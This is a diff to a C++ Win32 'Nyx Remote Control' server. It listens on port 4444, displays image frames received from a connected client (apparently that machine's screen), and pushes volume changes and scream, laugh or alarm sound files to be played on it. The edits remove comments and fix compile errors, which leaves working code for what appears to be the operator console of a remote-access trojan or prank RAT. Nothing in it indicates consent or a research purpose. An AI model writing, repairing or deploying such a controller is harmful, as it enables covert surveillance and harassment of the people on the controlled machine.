@@ -3,7 +3,7 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <gdiplus.h>
-#include <commctrl.h>        // for TRACKBAR_CLASS
+#include <commctrl.h>
 #include <string>
 #include <vector>
 #include <thread>
@@ -19,30 +19,25 @@
 
 const int PORT = 4444;
 
-// Global state
 std::vector<BYTE> g_LatestFrame;
 std::mutex g_FrameMutex;
 SOCKET g_ClientSocket = INVALID_SOCKET;
 std::mutex g_SocketMutex;
 
-// Window handles
 HWND g_hWnd;
 HWND g_hSlider;
 
-// Sound files to offer (must exist next to server.exe)
 const char* g_SoundFiles[] = { "scream.mp3", "laugh.mp3", "alarm.mp3" };
 const int g_NumSounds = sizeof(g_SoundFiles) / sizeof(g_SoundFiles[0]);
 
 // ------------------------------------------------------------------
-// Send a command packet to client
+// Send command + data to client
 // ------------------------------------------------------------------
 bool SendCommand(char cmd, const char* data, int dataLen) {
     std::lock_guard<std::mutex> lock(g_SocketMutex);
     if (g_ClientSocket == INVALID_SOCKET) return false;
     if (send(g_ClientSocket, &cmd, 1, 0) != 1) return false;
-    if (dataLen > 0) {
-        if (send(g_ClientSocket, data, dataLen, 0) != dataLen) return false;
-    }
+    if (dataLen > 0 && send(g_ClientSocket, data, dataLen, 0) != dataLen) return false;
     return true;
 }
 
@@ -51,7 +46,6 @@ bool SendVolume(int volPercent) {
 }
 
 bool SendPlaySound(const char* filename) {
-    // Read the file and send it
     std::ifstream file(filename, std::ios::binary | std::ios::ate);
     if (!file) return false;
     std::streamsize size = file.tellg();
@@ -59,18 +53,17 @@ bool SendPlaySound(const char* filename) {
     std::vector<char> buffer(size);
     if (!file.read(buffer.data(), size)) return false;
 
-    // Send 'P' + size + data
     std::lock_guard<std::mutex> lock(g_SocketMutex);
     if (g_ClientSocket == INVALID_SOCKET) return false;
     if (send(g_ClientSocket, "P", 1, 0) != 1) return false;
     int sz = (int)size;
     if (send(g_ClientSocket, (char*)&sz, 4, 0) != 4) return false;
-    if (send(g_ClientSocket, buffer.data(), (int)size, 0) != (int)size) return false;
+    if (send(g_ClientSocket, buffer.data(), sz, 0) != sz) return false;
     return true;
 }
 
 // ------------------------------------------------------------------
-// Frame receiver thread
+// Frame receiver (accepts client connection, stores frames)
 // ------------------------------------------------------------------
 void FrameReceiver() {
     SOCKET listenSock = socket(AF_INET, SOCK_STREAM, 0);
@@ -121,18 +114,19 @@ void FrameReceiver() {
 LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
         case WM_CREATE: {
-            // Create volume slider (trackbar)
-            g_hSlider = CreateWindowW(TRACKBAR_CLASSW, NULL,
+            // Volume slider
+            g_hSlider = CreateWindowExA(0, TRACKBAR_CLASSA, "",
                 WS_CHILD | WS_VISIBLE | TBS_HORZ | TBS_NOTICKS,
                 10, 10, 200, 30, hWnd, (HMENU)101, NULL, NULL);
             SendMessage(g_hSlider, TBM_SETRANGE, TRUE, MAKELONG(0, 100));
             SendMessage(g_hSlider, TBM_SETPOS, TRUE, 50);
 
-            // Create sound buttons
+            // Sound buttons
             for (int i = 0; i < g_NumSounds; ++i) {
-                CreateWindowA("BUTTON", g_SoundFiles[i],
+                CreateWindowExA(0, "BUTTON", g_SoundFiles[i],
                     WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-                    10, 50 + i * 30, 100, 25, hWnd, (HMENU)(200 + i), NULL, NULL);
+                    10, 50 + i * 30, 100, 25, hWnd,
+                    (HMENU)(INT_PTR)(200 + i), NULL, NULL);
             }
             return 0;
         }
@@ -148,10 +142,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         case WM_COMMAND: {
             int id = LOWORD(wParam);
             if (id >= 200 && id < 200 + g_NumSounds) {
-                int idx = id - 200;
-                if (!SendPlaySound(g_SoundFiles[idx])) {
-                    MessageBoxA(hWnd, "Failed to send sound file!", "Error", 0);
-                }
+                SendPlaySound(g_SoundFiles[id - 200]);
             }
             return 0;
         }
@@ -159,20 +150,17 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         case WM_PAINT: {
             PAINTSTRUCT ps;
             HDC hdc = BeginPaint(hWnd, &ps);
-
-            // Draw background
             RECT rc;
             GetClientRect(hWnd, &rc);
             FillRect(hdc, &rc, (HBRUSH)(COLOR_WINDOW + 1));
 
-            // Draw the latest frame (if any)
             std::vector<BYTE> frame;
             {
                 std::lock_guard<std::mutex> lock(g_FrameMutex);
                 frame = g_LatestFrame;
             }
+
             if (!frame.empty()) {
-                // Create a GDI+ bitmap from the JPEG memory
                 HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, frame.size());
                 if (hMem) {
                     void* pMem = GlobalLock(hMem);
@@ -183,13 +171,11 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                     Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromStream(pStream);
                     if (bitmap && bitmap->GetLastStatus() == Gdiplus::Ok) {
                         Gdiplus::Graphics graphics(hdc);
-                        // Scale to fit window (keep aspect)
                         int bmpW = bitmap->GetWidth();
                         int bmpH = bitmap->GetHeight();
                         int winW = rc.right - rc.left;
                         int winH = rc.bottom - rc.top;
-                        // Buttons & slider at top, so shift drawing down
-                        int offsetY = 120; // height of controls
+                        int offsetY = 120;
                         int availH = winH - offsetY;
                         if (availH <= 0) availH = 1;
                         float scale = min((float)winW / bmpW, (float)availH / bmpH);
@@ -222,28 +208,25 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 // WinMain
 // ------------------------------------------------------------------
 int main() {
-    // GDI+ startup
     Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
-    // Init common controls for trackbar
-    INITCOMMONCONTROLSEX icex{ sizeof(icex), ICC_BAR_CLASSES };
+    INITCOMMONCONTROLSEX icex = { sizeof(icex), ICC_BAR_CLASSES };
     InitCommonControlsEx(&icex);
 
-    // Start frame receiver thread
-    std::thread(frameReceiver).detach();
+    std::thread(FrameReceiver).detach();
 
-    // Register window class
-    WNDCLASSEX wc = { sizeof(wc) };
+    // Register ANSI window class
+    WNDCLASSEXA wc = { sizeof(wc) };
     wc.lpfnWndProc = WndProc;
     wc.hInstance = GetModuleHandle(NULL);
     wc.hCursor = LoadCursor(NULL, IDC_ARROW);
     wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
-    wc.lpszClassName = L"NyxServerWindow";
-    RegisterClassEx(&wc);
+    wc.lpszClassName = "NyxServerWindow";
+    RegisterClassExA(&wc);
 
-    g_hWnd = CreateWindowEx(0, L"NyxServerWindow", L"Nyx Remote Control",
+    g_hWnd = CreateWindowExA(0, "NyxServerWindow", "Nyx Remote Control",
         WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,
         NULL, NULL, wc.hInstance, NULL);
 
@@ -251,7 +234,6 @@ int main() {
     ShowWindow(g_hWnd, SW_SHOW);
     UpdateWindow(g_hWnd);
 
-    // Message loop
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
